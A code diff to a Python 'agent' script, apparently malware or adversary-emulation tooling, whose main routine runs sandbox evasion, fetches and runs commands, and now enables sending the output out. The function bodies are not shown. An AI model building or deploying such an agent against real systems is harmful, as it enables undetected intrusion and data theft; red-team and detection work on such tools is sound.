@@ -28,9 +28,8 @@ def execute_command(command_issued):
     if error is not '':
         return 'Error: ' + error
 
-    if success == '':
-        success = 'This command ran successfully but produced no console output'
-    return 'Success: ' + success
+    if success == '' or success != '':
+        return 'Success:' + success
 
 
 def get_platform():
@@ -161,13 +160,12 @@ def sandbox_evasion():
 if __name__ == '__main__':
     print('Agent running')
     sandbox_evasion()
-    # send_output()
-    print(datetime.datetime.now())
+
     techs = get_techniques()
     print(techs)
-    print(datetime.datetime.now())
     results = download_and_run_commands()
     print(results)
-    print(datetime.datetime.now())
+
+    send_output()
 
 
